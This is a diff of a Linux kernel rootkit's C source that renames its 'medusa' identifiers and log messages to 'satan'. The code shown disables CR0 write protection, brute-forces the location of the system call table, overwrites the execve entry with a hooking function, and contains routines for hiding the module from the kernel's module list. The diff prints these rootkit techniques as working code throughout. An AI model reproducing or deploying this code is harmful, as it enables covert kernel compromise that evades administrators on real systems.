@@ -8,13 +8,13 @@
 
 #define CR0_WP_DISABLE                                             \
         do {                                                       \
-                pr_info("medusa: disabling cr0 write protection"); \
+                pr_info("satan: disabling cr0 write protection"); \
                 write_cr0(read_cr0() & (~ 0x10000));               \
         } while (0);
 
 #define CR0_WP_DISABLE_END                                         \
         do {                                                       \
-                pr_info("medusa: enabling cr0 write protection");  \
+                pr_info("satan: enabling cr0 write protection");  \
                 write_cr0(read_cr0() | 0x10000);                   \
         } while (0);
 
@@ -24,9 +24,9 @@ static unsigned long *real_sys_read = NULL;
 static unsigned long ptr = 0;
 static struct list_head *module_prev = NULL;
 
-static void medusa_locate_sys_call_table(void);
-static bool medusa_is_hidden(void);
-static void medusa_set_hidden(bool hidden);
+static void satan_locate_sys_call_table(void);
+static bool satan_is_hidden(void);
+static void satan_set_hidden(bool hidden);
 
 
 /* from: /usr/src/linux-headers-$(uname -r)/include/linux/syscalls.h */
@@ -38,35 +38,35 @@ asmlinkage int new_execve(const char *filename,
                           char *const argv[],
                           char *const envp[])
 {
-        pr_info("medusa: hooked call to execve(%s, ...)\n", filename);
+        pr_info("satan: hooked call to execve(%s, ...)\n", filename);
         return real_execve(filename, argv, envp);
 }
 
 
-static int __init medusa_init(void)
+static int __init satan_init(void)
 {
-        pr_info("medusa: initializing rootkit...\n");
-        medusa_locate_sys_call_table();
-        //medusa_set_hidden(true);
+        pr_info("satan: initializing rootkit...\n");
+        satan_locate_sys_call_table();
+        //satan_set_hidden(true);
         return 0;
 }
 
-static void __exit medusa_exit(void)
+static void __exit satan_exit(void)
 {
-        pr_info("medusa: shutting down...\n");
-        //medusa_set_hidden(false);
+        pr_info("satan: shutting down...\n");
+        //satan_set_hidden(false);
 
         CR0_WP_DISABLE {
                 sys_call_table_ptr[__NR_execve] = (unsigned long *) real_execve;
-                pr_info("medusa: restored sys_execve: %p\n", sys_call_table_ptr[__NR_execve]);
+                pr_info("satan: restored sys_execve: %p\n", sys_call_table_ptr[__NR_execve]);
         } CR0_WP_DISABLE_END
 }
 
 
-static void medusa_locate_sys_call_table(void)
+static void satan_locate_sys_call_table(void)
 {
         real_sys_read = (void *) kallsyms_lookup_name("sys_read");
-        pr_info("medusa: sys_read: %p\n", real_sys_read);
+        pr_info("satan: sys_read: %p\n", real_sys_read);
 
         for (ptr = BRUTEFORCE_ADDR_BEGIN; ptr <= BRUTEFORCE_ADDR_END; ptr++) {
                 sys_call_table_ptr = (unsigned long **) ptr;
@@ -76,25 +76,25 @@ static void medusa_locate_sys_call_table(void)
                 }
         }
 
-        pr_info("medusa: sys_call_table           : %p\n", sys_call_table_ptr);
-        pr_info("medusa: sys_call_table[__NR_read]: %p\n", sys_call_table_ptr[__NR_read]);
+        pr_info("satan: sys_call_table           : %p\n", sys_call_table_ptr);
+        pr_info("satan: sys_call_table[__NR_read]: %p\n", sys_call_table_ptr[__NR_read]);
 
 
         CR0_WP_DISABLE {
                 real_execve = (void *) sys_call_table_ptr[__NR_execve];
-                pr_info("medusa: real_execve: %p\n", real_execve);
+                pr_info("satan: real_execve: %p\n", real_execve);
 
                 sys_call_table_ptr[__NR_execve] = (unsigned long *) new_execve;
-                pr_info("medusa: new sys_execve: %p\n", sys_call_table_ptr[__NR_execve]);
+                pr_info("satan: new sys_execve: %p\n", sys_call_table_ptr[__NR_execve]);
         }
 }
 
-static bool medusa_is_hidden(void)
+static bool satan_is_hidden(void)
 {
         return is_hidden;
 }
 
-static void medusa_set_hidden(bool hidden)
+static void satan_set_hidden(bool hidden)
 {
         if (is_hidden == hidden)
                 return;
@@ -111,8 +111,8 @@ static void medusa_set_hidden(bool hidden)
 }
 
 
-module_init(medusa_init);
-module_exit(medusa_exit);
+module_init(satan_init);
+module_exit(satan_exit);
 
 MODULE_LICENSE("GPL v2");
 MODULE_VERSION("0.01");
